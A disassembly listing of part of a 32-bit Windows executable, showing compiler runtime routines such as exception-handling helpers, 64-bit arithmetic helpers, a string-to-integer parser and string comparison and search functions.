  407a3f:	6a 00                	push   $0x0
  407a41:	6a 00                	push   $0x0
  407a43:	68 50 7a 40 00       	push   $0x407a50
  407a48:	ff 75 08             	push   0x8(%ebp)
  407a4b:	e8 4e 06 00 00       	call   0x40809e
  407a50:	5d                   	pop    %ebp
  407a51:	5f                   	pop    %edi
  407a52:	5e                   	pop    %esi
  407a53:	5b                   	pop    %ebx
  407a54:	8b e5                	mov    %ebp,%esp
  407a56:	5d                   	pop    %ebp
  407a57:	c3                   	ret
  407a58:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407a5c:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  407a63:	b8 01 00 00 00       	mov    $0x1,%eax
  407a68:	74 32                	je     0x407a9c
  407a6a:	8b 44 24 14          	mov    0x14(%esp),%eax
  407a6e:	8b 48 fc             	mov    -0x4(%eax),%ecx
  407a71:	33 c8                	xor    %eax,%ecx
  407a73:	e8 62 a5 ff ff       	call   0x401fda
  407a78:	55                   	push   %ebp
  407a79:	8b 68 10             	mov    0x10(%eax),%ebp
  407a7c:	8b 50 28             	mov    0x28(%eax),%edx
  407a7f:	52                   	push   %edx
  407a80:	8b 50 24             	mov    0x24(%eax),%edx
  407a83:	52                   	push   %edx
  407a84:	e8 14 00 00 00       	call   0x407a9d
  407a89:	83 c4 08             	add    $0x8,%esp
  407a8c:	5d                   	pop    %ebp
  407a8d:	8b 44 24 08          	mov    0x8(%esp),%eax
  407a91:	8b 54 24 10          	mov    0x10(%esp),%edx
  407a95:	89 02                	mov    %eax,(%edx)
  407a97:	b8 03 00 00 00       	mov    $0x3,%eax
  407a9c:	c3                   	ret
  407a9d:	53                   	push   %ebx
  407a9e:	56                   	push   %esi
  407a9f:	57                   	push   %edi
  407aa0:	8b 44 24 10          	mov    0x10(%esp),%eax
  407aa4:	55                   	push   %ebp
  407aa5:	50                   	push   %eax
  407aa6:	6a fe                	push   $0xfffffffe
  407aa8:	68 58 7a 40 00       	push   $0x407a58
  407aad:	64 ff 35 00 00 00 00 	push   %fs:0x0
  407ab4:	a1 20 c0 40 00       	mov    0x40c020,%eax
  407ab9:	33 c4                	xor    %esp,%eax
  407abb:	50                   	push   %eax
  407abc:	8d 44 24 04          	lea    0x4(%esp),%eax
  407ac0:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407ac6:	8b 44 24 28          	mov    0x28(%esp),%eax
  407aca:	8b 58 08             	mov    0x8(%eax),%ebx
  407acd:	8b 70 0c             	mov    0xc(%eax),%esi
  407ad0:	83 fe ff             	cmp    $0xffffffff,%esi
  407ad3:	74 3a                	je     0x407b0f
  407ad5:	83 7c 24 2c ff       	cmpl   $0xffffffff,0x2c(%esp)
  407ada:	74 06                	je     0x407ae2
  407adc:	3b 74 24 2c          	cmp    0x2c(%esp),%esi
  407ae0:	76 2d                	jbe    0x407b0f
  407ae2:	8d 34 76             	lea    (%esi,%esi,2),%esi
  407ae5:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  407ae8:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  407aec:	89 48 0c             	mov    %ecx,0xc(%eax)
  407aef:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  407af4:	75 17                	jne    0x407b0d
  407af6:	68 01 01 00 00       	push   $0x101
  407afb:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  407aff:	e8 49 00 00 00       	call   0x407b4d
  407b04:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  407b08:	e8 5f 00 00 00       	call   0x407b6c
  407b0d:	eb b7                	jmp    0x407ac6
  407b0f:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  407b13:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  407b1a:	83 c4 18             	add    $0x18,%esp
  407b1d:	5f                   	pop    %edi
  407b1e:	5e                   	pop    %esi
  407b1f:	5b                   	pop    %ebx
  407b20:	c3                   	ret
  407b21:	33 c0                	xor    %eax,%eax
  407b23:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  407b2a:	81 79 04 58 7a 40 00 	cmpl   $0x407a58,0x4(%ecx)
  407b31:	75 10                	jne    0x407b43
  407b33:	8b 51 0c             	mov    0xc(%ecx),%edx
  407b36:	8b 52 0c             	mov    0xc(%edx),%edx
  407b39:	39 51 08             	cmp    %edx,0x8(%ecx)
  407b3c:	75 05                	jne    0x407b43
  407b3e:	b8 01 00 00 00       	mov    $0x1,%eax
  407b43:	c3                   	ret
  407b44:	53                   	push   %ebx
  407b45:	51                   	push   %ecx
  407b46:	bb 90 cc 40 00       	mov    $0x40cc90,%ebx
  407b4b:	eb 0b                	jmp    0x407b58
  407b4d:	53                   	push   %ebx
  407b4e:	51                   	push   %ecx
  407b4f:	bb 90 cc 40 00       	mov    $0x40cc90,%ebx
  407b54:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  407b58:	89 4b 08             	mov    %ecx,0x8(%ebx)
  407b5b:	89 43 04             	mov    %eax,0x4(%ebx)
  407b5e:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  407b61:	55                   	push   %ebp
  407b62:	51                   	push   %ecx
  407b63:	50                   	push   %eax
  407b64:	58                   	pop    %eax
  407b65:	59                   	pop    %ecx
  407b66:	5d                   	pop    %ebp
  407b67:	59                   	pop    %ecx
  407b68:	5b                   	pop    %ebx
  407b69:	c2 04 00             	ret    $0x4
  407b6c:	ff d0                	call   *%eax
  407b6e:	c3                   	ret
  407b6f:	55                   	push   %ebp
  407b70:	8b ec                	mov    %esp,%ebp
  407b72:	83 ec 18             	sub    $0x18,%esp
  407b75:	53                   	push   %ebx
  407b76:	ff 75 10             	push   0x10(%ebp)
  407b79:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  407b7c:	e8 e6 bd ff ff       	call   0x403967
  407b81:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407b84:	8d 43 01             	lea    0x1(%ebx),%eax
  407b87:	3d 00 01 00 00       	cmp    $0x100,%eax
  407b8c:	77 0f                	ja     0x407b9d
  407b8e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407b91:	8b 80 c8 00 00 00    	mov    0xc8(%eax),%eax
  407b97:	0f b7 04 58          	movzwl (%eax,%ebx,2),%eax
  407b9b:	eb 75                	jmp    0x407c12
  407b9d:	89 5d 08             	mov    %ebx,0x8(%ebp)
  407ba0:	c1 7d 08 08          	sarl   $0x8,0x8(%ebp)
  407ba4:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407ba7:	50                   	push   %eax
  407ba8:	8b 45 08             	mov    0x8(%ebp),%eax
  407bab:	25 ff 00 00 00       	and    $0xff,%eax
  407bb0:	50                   	push   %eax
  407bb1:	e8 13 fc ff ff       	call   0x4077c9
  407bb6:	85 c0                	test   %eax,%eax
  407bb8:	59                   	pop    %ecx
  407bb9:	59                   	pop    %ecx
  407bba:	74 12                	je     0x407bce
  407bbc:	8a 45 08             	mov    0x8(%ebp),%al
  407bbf:	6a 02                	push   $0x2
  407bc1:	88 45 f8             	mov    %al,-0x8(%ebp)
  407bc4:	88 5d f9             	mov    %bl,-0x7(%ebp)
  407bc7:	c6 45 fa 00          	movb   $0x0,-0x6(%ebp)
  407bcb:	59                   	pop    %ecx
  407bcc:	eb 0a                	jmp    0x407bd8
  407bce:	33 c9                	xor    %ecx,%ecx
  407bd0:	88 5d f8             	mov    %bl,-0x8(%ebp)
  407bd3:	c6 45 f9 00          	movb   $0x0,-0x7(%ebp)
  407bd7:	41                   	inc    %ecx
  407bd8:	8b 45 e8             	mov    -0x18(%ebp),%eax
  407bdb:	6a 01                	push   $0x1
  407bdd:	ff 70 14             	push   0x14(%eax)
  407be0:	ff 70 04             	push   0x4(%eax)
  407be3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407be6:	50                   	push   %eax
  407be7:	51                   	push   %ecx
  407be8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407beb:	50                   	push   %eax
  407bec:	8d 45 e8             	lea    -0x18(%ebp),%eax
  407bef:	6a 01                	push   $0x1
  407bf1:	50                   	push   %eax
  407bf2:	e8 5c eb ff ff       	call   0x406753
  407bf7:	83 c4 20             	add    $0x20,%esp
  407bfa:	85 c0                	test   %eax,%eax
  407bfc:	75 10                	jne    0x407c0e
  407bfe:	38 45 f4             	cmp    %al,-0xc(%ebp)
  407c01:	74 07                	je     0x407c0a
  407c03:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407c06:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  407c0a:	33 c0                	xor    %eax,%eax
  407c0c:	eb 14                	jmp    0x407c22
  407c0e:	0f b7 45 fc          	movzwl -0x4(%ebp),%eax
  407c12:	23 45 0c             	and    0xc(%ebp),%eax
  407c15:	80 7d f4 00          	cmpb   $0x0,-0xc(%ebp)
  407c19:	74 07                	je     0x407c22
  407c1b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407c1e:	83 61 70 fd          	andl   $0xfffffffd,0x70(%ecx)
  407c22:	5b                   	pop    %ebx
  407c23:	c9                   	leave
  407c24:	c3                   	ret
  407c25:	cc                   	int3
  407c26:	cc                   	int3
  407c27:	cc                   	int3
  407c28:	cc                   	int3
  407c29:	cc                   	int3
  407c2a:	cc                   	int3
  407c2b:	cc                   	int3
  407c2c:	cc                   	int3
  407c2d:	cc                   	int3
  407c2e:	cc                   	int3
  407c2f:	cc                   	int3
  407c30:	56                   	push   %esi
  407c31:	8b 44 24 14          	mov    0x14(%esp),%eax
  407c35:	0b c0                	or     %eax,%eax
  407c37:	75 28                	jne    0x407c61
  407c39:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407c3d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  407c41:	33 d2                	xor    %edx,%edx
  407c43:	f7 f1                	div    %ecx
  407c45:	8b d8                	mov    %eax,%ebx
  407c47:	8b 44 24 08          	mov    0x8(%esp),%eax
  407c4b:	f7 f1                	div    %ecx
  407c4d:	8b f0                	mov    %eax,%esi
  407c4f:	8b c3                	mov    %ebx,%eax
  407c51:	f7 64 24 10          	mull   0x10(%esp)
  407c55:	8b c8                	mov    %eax,%ecx
  407c57:	8b c6                	mov    %esi,%eax
  407c59:	f7 64 24 10          	mull   0x10(%esp)
  407c5d:	03 d1                	add    %ecx,%edx
  407c5f:	eb 47                	jmp    0x407ca8
  407c61:	8b c8                	mov    %eax,%ecx
  407c63:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  407c67:	8b 54 24 0c          	mov    0xc(%esp),%edx
  407c6b:	8b 44 24 08          	mov    0x8(%esp),%eax
  407c6f:	d1 e9                	shr    $1,%ecx
  407c71:	d1 db                	rcr    $1,%ebx
  407c73:	d1 ea                	shr    $1,%edx
  407c75:	d1 d8                	rcr    $1,%eax
  407c77:	0b c9                	or     %ecx,%ecx
  407c79:	75 f4                	jne    0x407c6f
  407c7b:	f7 f3                	div    %ebx
  407c7d:	8b f0                	mov    %eax,%esi
  407c7f:	f7 64 24 14          	mull   0x14(%esp)
  407c83:	8b c8                	mov    %eax,%ecx
  407c85:	8b 44 24 10          	mov    0x10(%esp),%eax
  407c89:	f7 e6                	mul    %esi
  407c8b:	03 d1                	add    %ecx,%edx
  407c8d:	72 0e                	jb     0x407c9d
  407c8f:	3b 54 24 0c          	cmp    0xc(%esp),%edx
  407c93:	77 08                	ja     0x407c9d
  407c95:	72 0f                	jb     0x407ca6
  407c97:	3b 44 24 08          	cmp    0x8(%esp),%eax
  407c9b:	76 09                	jbe    0x407ca6
  407c9d:	4e                   	dec    %esi
  407c9e:	2b 44 24 10          	sub    0x10(%esp),%eax
  407ca2:	1b 54 24 14          	sbb    0x14(%esp),%edx
  407ca6:	33 db                	xor    %ebx,%ebx
  407ca8:	2b 44 24 08          	sub    0x8(%esp),%eax
  407cac:	1b 54 24 0c          	sbb    0xc(%esp),%edx
  407cb0:	f7 da                	neg    %edx
  407cb2:	f7 d8                	neg    %eax
  407cb4:	83 da 00             	sbb    $0x0,%edx
  407cb7:	8b ca                	mov    %edx,%ecx
  407cb9:	8b d3                	mov    %ebx,%edx
  407cbb:	8b d9                	mov    %ecx,%ebx
  407cbd:	8b c8                	mov    %eax,%ecx
  407cbf:	8b c6                	mov    %esi,%eax
  407cc1:	5e                   	pop    %esi
  407cc2:	c2 10 00             	ret    $0x10
  407cc5:	cc                   	int3
  407cc6:	cc                   	int3
  407cc7:	cc                   	int3
  407cc8:	cc                   	int3
  407cc9:	cc                   	int3
  407cca:	cc                   	int3
  407ccb:	cc                   	int3
  407ccc:	cc                   	int3
  407ccd:	cc                   	int3
  407cce:	cc                   	int3
  407ccf:	cc                   	int3
  407cd0:	8b 44 24 08          	mov    0x8(%esp),%eax
  407cd4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  407cd8:	0b c8                	or     %eax,%ecx
  407cda:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  407cde:	75 09                	jne    0x407ce9
  407ce0:	8b 44 24 04          	mov    0x4(%esp),%eax
  407ce4:	f7 e1                	mul    %ecx
  407ce6:	c2 10 00             	ret    $0x10
  407ce9:	53                   	push   %ebx
  407cea:	f7 e1                	mul    %ecx
  407cec:	8b d8                	mov    %eax,%ebx
  407cee:	8b 44 24 08          	mov    0x8(%esp),%eax
  407cf2:	f7 64 24 14          	mull   0x14(%esp)
  407cf6:	03 d8                	add    %eax,%ebx
  407cf8:	8b 44 24 08          	mov    0x8(%esp),%eax
  407cfc:	f7 e1                	mul    %ecx
  407cfe:	03 d3                	add    %ebx,%edx
  407d00:	5b                   	pop    %ebx
  407d01:	c2 10 00             	ret    $0x10
  407d04:	55                   	push   %ebp
  407d05:	8b ec                	mov    %esp,%ebp
  407d07:	83 ec 14             	sub    $0x14,%esp
  407d0a:	56                   	push   %esi
  407d0b:	57                   	push   %edi
  407d0c:	ff 75 08             	push   0x8(%ebp)
  407d0f:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  407d12:	e8 50 bc ff ff       	call   0x403967
  407d17:	8b 45 10             	mov    0x10(%ebp),%eax
  407d1a:	8b 75 0c             	mov    0xc(%ebp),%esi
  407d1d:	33 ff                	xor    %edi,%edi
  407d1f:	3b c7                	cmp    %edi,%eax
  407d21:	74 02                	je     0x407d25
  407d23:	89 30                	mov    %esi,(%eax)
  407d25:	3b f7                	cmp    %edi,%esi
  407d27:	75 2c                	jne    0x407d55
  407d29:	e8 ff c6 ff ff       	call   0x40442d
  407d2e:	57                   	push   %edi
  407d2f:	57                   	push   %edi
  407d30:	57                   	push   %edi
  407d31:	57                   	push   %edi
  407d32:	57                   	push   %edi
  407d33:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  407d39:	e8 bc 94 ff ff       	call   0x4011fa
  407d3e:	83 c4 14             	add    $0x14,%esp
  407d41:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  407d45:	74 07                	je     0x407d4e
  407d47:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407d4a:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  407d4e:	33 c0                	xor    %eax,%eax
  407d50:	e9 d6 01 00 00       	jmp    0x407f2b
  407d55:	39 7d 14             	cmp    %edi,0x14(%ebp)
  407d58:	74 0c                	je     0x407d66
  407d5a:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  407d5e:	7c c9                	jl     0x407d29
  407d60:	83 7d 14 24          	cmpl   $0x24,0x14(%ebp)
  407d64:	7f c3                	jg     0x407d29
  407d66:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407d69:	53                   	push   %ebx
  407d6a:	8a 1e                	mov    (%esi),%bl
  407d6c:	89 7d fc             	mov    %edi,-0x4(%ebp)
  407d6f:	8d 7e 01             	lea    0x1(%esi),%edi
  407d72:	83 b9 ac 00 00 00 01 	cmpl   $0x1,0xac(%ecx)
  407d79:	7e 17                	jle    0x407d92
  407d7b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  407d7e:	50                   	push   %eax
  407d7f:	0f b6 c3             	movzbl %bl,%eax
  407d82:	6a 08                	push   $0x8
  407d84:	50                   	push   %eax
  407d85:	e8 e5 fd ff ff       	call   0x407b6f
  407d8a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  407d8d:	83 c4 0c             	add    $0xc,%esp
  407d90:	eb 10                	jmp    0x407da2
  407d92:	8b 91 c8 00 00 00    	mov    0xc8(%ecx),%edx
  407d98:	0f b6 c3             	movzbl %bl,%eax
  407d9b:	0f b6 04 42          	movzbl (%edx,%eax,2),%eax
  407d9f:	83 e0 08             	and    $0x8,%eax
  407da2:	85 c0                	test   %eax,%eax
  407da4:	74 05                	je     0x407dab
  407da6:	8a 1f                	mov    (%edi),%bl
  407da8:	47                   	inc    %edi
  407da9:	eb c7                	jmp    0x407d72
  407dab:	80 fb 2d             	cmp    $0x2d,%bl
  407dae:	75 06                	jne    0x407db6
  407db0:	83 4d 18 02          	orl    $0x2,0x18(%ebp)
  407db4:	eb 05                	jmp    0x407dbb
  407db6:	80 fb 2b             	cmp    $0x2b,%bl
  407db9:	75 03                	jne    0x407dbe
  407dbb:	8a 1f                	mov    (%edi),%bl
  407dbd:	47                   	inc    %edi
  407dbe:	8b 45 14             	mov    0x14(%ebp),%eax
  407dc1:	85 c0                	test   %eax,%eax
  407dc3:	0f 8c 49 01 00 00    	jl     0x407f12
  407dc9:	83 f8 01             	cmp    $0x1,%eax
  407dcc:	0f 84 40 01 00 00    	je     0x407f12
  407dd2:	83 f8 24             	cmp    $0x24,%eax
  407dd5:	0f 8f 37 01 00 00    	jg     0x407f12
  407ddb:	85 c0                	test   %eax,%eax
  407ddd:	75 2a                	jne    0x407e09
  407ddf:	80 fb 30             	cmp    $0x30,%bl
  407de2:	74 09                	je     0x407ded
  407de4:	c7 45 14 0a 00 00 00 	movl   $0xa,0x14(%ebp)
  407deb:	eb 34                	jmp    0x407e21
  407ded:	8a 07                	mov    (%edi),%al
  407def:	3c 78                	cmp    $0x78,%al
  407df1:	74 0d                	je     0x407e00
  407df3:	3c 58                	cmp    $0x58,%al
  407df5:	74 09                	je     0x407e00
  407df7:	c7 45 14 08 00 00 00 	movl   $0x8,0x14(%ebp)
  407dfe:	eb 21                	jmp    0x407e21
  407e00:	c7 45 14 10 00 00 00 	movl   $0x10,0x14(%ebp)
  407e07:	eb 0a                	jmp    0x407e13
  407e09:	83 f8 10             	cmp    $0x10,%eax
  407e0c:	75 13                	jne    0x407e21
  407e0e:	80 fb 30             	cmp    $0x30,%bl
  407e11:	75 0e                	jne    0x407e21
  407e13:	8a 07                	mov    (%edi),%al
  407e15:	3c 78                	cmp    $0x78,%al
  407e17:	74 04                	je     0x407e1d
  407e19:	3c 58                	cmp    $0x58,%al
  407e1b:	75 04                	jne    0x407e21
  407e1d:	47                   	inc    %edi
  407e1e:	8a 1f                	mov    (%edi),%bl
  407e20:	47                   	inc    %edi
  407e21:	8b b1 c8 00 00 00    	mov    0xc8(%ecx),%esi
  407e27:	83 c8 ff             	or     $0xffffffff,%eax
  407e2a:	33 d2                	xor    %edx,%edx
  407e2c:	f7 75 14             	divl   0x14(%ebp)
  407e2f:	0f b6 cb             	movzbl %bl,%ecx
  407e32:	0f b7 0c 4e          	movzwl (%esi,%ecx,2),%ecx
  407e36:	f6 c1 04             	test   $0x4,%cl
  407e39:	74 08                	je     0x407e43
  407e3b:	0f be cb             	movsbl %bl,%ecx
  407e3e:	83 e9 30             	sub    $0x30,%ecx
  407e41:	eb 1a                	jmp    0x407e5d
  407e43:	66 f7 c1 03 01       	test   $0x103,%cx
  407e48:	74 31                	je     0x407e7b
  407e4a:	8a cb                	mov    %bl,%cl
  407e4c:	80 e9 61             	sub    $0x61,%cl
  407e4f:	80 f9 19             	cmp    $0x19,%cl
  407e52:	0f be cb             	movsbl %bl,%ecx
  407e55:	77 03                	ja     0x407e5a
  407e57:	83 e9 20             	sub    $0x20,%ecx
  407e5a:	83 c1 c9             	add    $0xffffffc9,%ecx
  407e5d:	3b 4d 14             	cmp    0x14(%ebp),%ecx
  407e60:	73 19                	jae    0x407e7b
  407e62:	83 4d 18 08          	orl    $0x8,0x18(%ebp)
  407e66:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  407e69:	72 27                	jb     0x407e92
  407e6b:	75 04                	jne    0x407e71
  407e6d:	3b ca                	cmp    %edx,%ecx
  407e6f:	76 21                	jbe    0x407e92
  407e71:	83 4d 18 04          	orl    $0x4,0x18(%ebp)
  407e75:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  407e79:	75 23                	jne    0x407e9e
  407e7b:	8b 45 18             	mov    0x18(%ebp),%eax
  407e7e:	4f                   	dec    %edi
  407e7f:	a8 08                	test   $0x8,%al
  407e81:	75 20                	jne    0x407ea3
  407e83:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  407e87:	74 03                	je     0x407e8c
  407e89:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407e8c:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  407e90:	eb 5c                	jmp    0x407eee
  407e92:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  407e95:	0f af 5d 14          	imul   0x14(%ebp),%ebx
  407e99:	03 d9                	add    %ecx,%ebx
  407e9b:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407e9e:	8a 1f                	mov    (%edi),%bl
  407ea0:	47                   	inc    %edi
  407ea1:	eb 8c                	jmp    0x407e2f
  407ea3:	a8 04                	test   $0x4,%al
  407ea5:	be ff ff ff 7f       	mov    $0x7fffffff,%esi
  407eaa:	75 1b                	jne    0x407ec7
  407eac:	a8 01                	test   $0x1,%al
  407eae:	75 3e                	jne    0x407eee
  407eb0:	83 e0 02             	and    $0x2,%eax
  407eb3:	74 09                	je     0x407ebe
  407eb5:	81 7d fc 00 00 00 80 	cmpl   $0x80000000,-0x4(%ebp)
  407ebc:	77 09                	ja     0x407ec7
  407ebe:	85 c0                	test   %eax,%eax
  407ec0:	75 2c                	jne    0x407eee
  407ec2:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  407ec5:	76 27                	jbe    0x407eee
  407ec7:	e8 61 c5 ff ff       	call   0x40442d
  407ecc:	f6 45 18 01          	testb  $0x1,0x18(%ebp)
  407ed0:	c7 00 22 00 00 00    	movl   $0x22,(%eax)
  407ed6:	74 06                	je     0x407ede
  407ed8:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  407edc:	eb 10                	jmp    0x407eee
  407ede:	8a 45 18             	mov    0x18(%ebp),%al
  407ee1:	24 02                	and    $0x2,%al
  407ee3:	f6 d8                	neg    %al
  407ee5:	1b c0                	sbb    %eax,%eax
  407ee7:	f7 d8                	neg    %eax
  407ee9:	03 c6                	add    %esi,%eax
  407eeb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407eee:	8b 45 10             	mov    0x10(%ebp),%eax
  407ef1:	85 c0                	test   %eax,%eax
  407ef3:	74 02                	je     0x407ef7
  407ef5:	89 38                	mov    %edi,(%eax)
  407ef7:	f6 45 18 02          	testb  $0x2,0x18(%ebp)
  407efb:	74 03                	je     0x407f00
  407efd:	f7 5d fc             	negl   -0x4(%ebp)
  407f00:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  407f04:	74 07                	je     0x407f0d
  407f06:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407f09:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  407f0d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407f10:	eb 18                	jmp    0x407f2a
  407f12:	8b 45 10             	mov    0x10(%ebp),%eax
  407f15:	85 c0                	test   %eax,%eax
  407f17:	74 02                	je     0x407f1b
  407f19:	89 30                	mov    %esi,(%eax)
  407f1b:	80 7d f8 00          	cmpb   $0x0,-0x8(%ebp)
  407f1f:	74 07                	je     0x407f28
  407f21:	8b 45 f4             	mov    -0xc(%ebp),%eax
  407f24:	83 60 70 fd          	andl   $0xfffffffd,0x70(%eax)
  407f28:	33 c0                	xor    %eax,%eax
  407f2a:	5b                   	pop    %ebx
  407f2b:	5f                   	pop    %edi
  407f2c:	5e                   	pop    %esi
  407f2d:	c9                   	leave
  407f2e:	c3                   	ret
  407f2f:	55                   	push   %ebp
  407f30:	8b ec                	mov    %esp,%ebp
  407f32:	33 c0                	xor    %eax,%eax
  407f34:	39 05 00 d2 40 00    	cmp    %eax,0x40d200
  407f3a:	50                   	push   %eax
  407f3b:	ff 75 10             	push   0x10(%ebp)
  407f3e:	ff 75 0c             	push   0xc(%ebp)
  407f41:	ff 75 08             	push   0x8(%ebp)
  407f44:	75 07                	jne    0x407f4d
  407f46:	68 70 c2 40 00       	push   $0x40c270
  407f4b:	eb 01                	jmp    0x407f4e
  407f4d:	50                   	push   %eax
  407f4e:	e8 b1 fd ff ff       	call   0x407d04
  407f53:	83 c4 14             	add    $0x14,%esp
  407f56:	5d                   	pop    %ebp
  407f57:	c3                   	ret
  407f58:	cc                   	int3
  407f59:	cc                   	int3
  407f5a:	cc                   	int3
  407f5b:	cc                   	int3
  407f5c:	cc                   	int3
  407f5d:	cc                   	int3
  407f5e:	cc                   	int3
  407f5f:	cc                   	int3
  407f60:	55                   	push   %ebp
  407f61:	8b ec                	mov    %esp,%ebp
  407f63:	57                   	push   %edi
  407f64:	56                   	push   %esi
  407f65:	53                   	push   %ebx
  407f66:	8b 4d 10             	mov    0x10(%ebp),%ecx
  407f69:	0b c9                	or     %ecx,%ecx
  407f6b:	74 4d                	je     0x407fba
  407f6d:	8b 75 08             	mov    0x8(%ebp),%esi
  407f70:	8b 7d 0c             	mov    0xc(%ebp),%edi
  407f73:	b7 41                	mov    $0x41,%bh
  407f75:	b3 5a                	mov    $0x5a,%bl
  407f77:	b6 20                	mov    $0x20,%dh
  407f79:	8d 49 00             	lea    0x0(%ecx),%ecx
  407f7c:	8a 26                	mov    (%esi),%ah
  407f7e:	0a e4                	or     %ah,%ah
  407f80:	8a 07                	mov    (%edi),%al
  407f82:	74 27                	je     0x407fab
  407f84:	0a c0                	or     %al,%al
  407f86:	74 23                	je     0x407fab
  407f88:	83 c6 01             	add    $0x1,%esi
  407f8b:	83 c7 01             	add    $0x1,%edi
  407f8e:	3a e7                	cmp    %bh,%ah
  407f90:	72 06                	jb     0x407f98
  407f92:	3a e3                	cmp    %bl,%ah
  407f94:	77 02                	ja     0x407f98
  407f96:	02 e6                	add    %dh,%ah
  407f98:	3a c7                	cmp    %bh,%al
  407f9a:	72 06                	jb     0x407fa2
  407f9c:	3a c3                	cmp    %bl,%al
  407f9e:	77 02                	ja     0x407fa2
  407fa0:	02 c6                	add    %dh,%al
  407fa2:	3a e0                	cmp    %al,%ah
  407fa4:	75 0b                	jne    0x407fb1
  407fa6:	83 e9 01             	sub    $0x1,%ecx
  407fa9:	75 d1                	jne    0x407f7c
  407fab:	33 c9                	xor    %ecx,%ecx
  407fad:	3a e0                	cmp    %al,%ah
  407faf:	74 09                	je     0x407fba
  407fb1:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  407fb6:	72 02                	jb     0x407fba
  407fb8:	f7 d9                	neg    %ecx
  407fba:	8b c1                	mov    %ecx,%eax
  407fbc:	5b                   	pop    %ebx
  407fbd:	5e                   	pop    %esi
  407fbe:	5f                   	pop    %edi
  407fbf:	c9                   	leave
  407fc0:	c3                   	ret
  407fc1:	cc                   	int3
  407fc2:	cc                   	int3
  407fc3:	cc                   	int3
  407fc4:	cc                   	int3
  407fc5:	cc                   	int3
  407fc6:	cc                   	int3
  407fc7:	cc                   	int3
  407fc8:	cc                   	int3
  407fc9:	cc                   	int3
  407fca:	cc                   	int3
  407fcb:	cc                   	int3
  407fcc:	cc                   	int3
  407fcd:	cc                   	int3
  407fce:	cc                   	int3
  407fcf:	cc                   	int3
  407fd0:	8d 42 ff             	lea    -0x1(%edx),%eax
  407fd3:	5b                   	pop    %ebx
  407fd4:	c3                   	ret
  407fd5:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  407fdc:	8d 64 24 00          	lea    0x0(%esp),%esp
  407fe0:	33 c0                	xor    %eax,%eax
  407fe2:	8a 44 24 08          	mov    0x8(%esp),%al
  407fe6:	53                   	push   %ebx
  407fe7:	8b d8                	mov    %eax,%ebx
  407fe9:	c1 e0 08             	shl    $0x8,%eax
  407fec:	8b 54 24 08          	mov    0x8(%esp),%edx
  407ff0:	f7 c2 03 00 00 00    	test   $0x3,%edx
  407ff6:	74 15                	je     0x40800d
  407ff8:	8a 0a                	mov    (%edx),%cl
  407ffa:	83 c2 01             	add    $0x1,%edx
  407ffd:	3a cb                	cmp    %bl,%cl
  407fff:	74 cf                	je     0x407fd0
  408001:	84 c9                	test   %cl,%cl
  408003:	74 51                	je     0x408056
  408005:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40800b:	75 eb                	jne    0x407ff8
  40800d:	0b d8                	or     %eax,%ebx
  40800f:	57                   	push   %edi
  408010:	8b c3                	mov    %ebx,%eax
  408012:	c1 e3 10             	shl    $0x10,%ebx
  408015:	56                   	push   %esi
  408016:	0b d8                	or     %eax,%ebx
  408018:	8b 0a                	mov    (%edx),%ecx
  40801a:	bf ff fe fe 7e       	mov    $0x7efefeff,%edi
  40801f:	8b c1                	mov    %ecx,%eax
  408021:	8b f7                	mov    %edi,%esi
  408023:	33 cb                	xor    %ebx,%ecx
  408025:	03 f0                	add    %eax,%esi
  408027:	03 f9                	add    %ecx,%edi
  408029:	83 f1 ff             	xor    $0xffffffff,%ecx
  40802c:	83 f0 ff             	xor    $0xffffffff,%eax
  40802f:	33 cf                	xor    %edi,%ecx
  408031:	33 c6                	xor    %esi,%eax
  408033:	83 c2 04             	add    $0x4,%edx
